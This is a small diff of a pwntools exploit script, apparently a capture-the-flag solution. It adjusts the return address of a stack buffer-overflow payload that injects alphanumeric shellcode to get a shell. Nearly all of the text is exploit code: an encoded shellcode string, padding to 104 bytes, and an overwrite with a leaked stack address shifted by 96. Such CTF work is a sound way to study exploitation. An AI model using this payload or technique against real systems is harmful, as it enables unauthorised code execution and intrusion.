@@ -156,7 +156,7 @@ p.sendlineafter('name: ','-1')
 # crafting payload
 payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
 payload += b'A'*(104 - len(payload)) # junk
-payload += p64(stack_leak) # stack base
+payload += p64(stack_leak-96) # stack base
 
 # sending exploit & getting shell
 p.sendlineafter('Name: ',payload)
